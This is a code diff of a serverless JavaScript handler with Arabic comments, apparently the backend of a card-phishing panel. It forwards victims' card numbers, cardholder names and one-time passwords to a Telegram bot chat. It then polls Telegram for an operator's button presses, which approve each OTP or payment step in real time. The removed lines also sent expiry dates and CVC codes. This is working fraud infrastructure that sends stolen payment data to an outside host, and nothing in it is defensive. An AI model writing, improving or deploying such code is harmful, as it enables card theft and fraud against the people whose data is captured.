@@ -10,14 +10,13 @@ export default async function handler(req, res) {
   const method = req.method;
   const body = req.body || {};
 
-  // 1. إذا طلب المتصفح فحص حالة الـ OTP (الاستعلام المباشر من تليجرام)
+  // 1. فحص الحالة بالاستعلام المباشر عن تفاعلات الأزرار من تليجرام
   if (method === 'GET') {
     const { user_id } = req.query;
     if (!user_id) return res.status(200).json({ status: 'pending' });
 
     try {
-      // فحص أحدث تفاعلات الأزرار من تليجرام مباشرة بدون الحاجة لذاكرة سيرفر
-      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-30&allowed_updates=["callback_query"]`);
+      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-40&allowed_updates=["callback_query"]`);
       const tgData = await tgRes.json();
 
       let status = 'pending';
@@ -25,7 +24,6 @@ export default async function handler(req, res) {
         for (const update of tgData.result) {
           if (update.callback_query) {
             const data = update.callback_query.data;
-            // التحقق مما إذا كان الزر المضغوط يخص هذا الـ user_id بالذات
             if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
               status = 'approved';
               break;
@@ -42,7 +40,7 @@ export default async function handler(req, res) {
     }
   }
 
-  // 2. إذا ضغطت أنت على الأزرار في تليجرام (تأكيد الضغطة وإرسال الرد للبوت)
+  // 2. معالجة ضغطات الأزرار (Callback Query)
   if (body.callback_query) {
     const callback = body.callback_query;
     const chatId = callback.message.chat.id;
@@ -68,27 +66,12 @@ export default async function handler(req, res) {
     return res.status(200).json({ ok: true });
   }
 
-  // 3. إرسال بيانات الفيزا أو الـ OTP إلى تليجرام
-  let text = '';
-  let actionType = 'pay';
+  // 3. إرسال الطلب للبوت
+  const text = body.رمز_التحقق_OTP 
+    ? `🔐 *طلب رمز تحقق (OTP)*\n\n🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n💳 البطاقة: \`${body.رقم_البطاقة}\`\n👤 الاسم: ${body.اسم_الحامل}\n🆔 معرف المستخدم: \`${body.user_id}\``
+    : `💳 *طلب بطاقة جديد*\n\n👤 الاسم: ${body.card_name}\n💳 الرقم: \`${body.card_number}\`\n🆔 معرف المستخدم: \`${body.user_id}\``;
 
-  if (body.رمز_التحقق_OTP) {
-    actionType = 'otp';
-    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
-           `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
-           `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
-           `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
-           `🆔 معرف المستخدم: \`${body.user_id}\``;
-  } else {
-    actionType = 'pay';
-    text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
-           `👤 اسم الحامل: ${body.card_name || 'غير محدد'}\n` +
-           `💳 رقم البطاقة: \`${body.card_number || ''}\`\n` +
-           `📅 الانتهاء: ${body.exp_date || ''}\n` +
-           `🔒 CVC: \`${body.cvc || ''}\`\n` +
-           `🆔 معرف المستخدم: \`${body.user_id}\``;
-  }
-
+  const actionType = body.رمز_التحقق_OTP ? 'otp' : 'pay';
   const keyboard = {
     inline_keyboard: [
       [
@@ -98,20 +81,16 @@ export default async function handler(req, res) {
     ]
   };
 
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown',
-        reply_markup: keyboard
-      })
-    });
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: 'Markdown',
+      reply_markup: keyboard
+    })
+  });
 
-    return res.status(200).json({ ok: true });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
+  return res.status(200).json({ ok: true });
 }
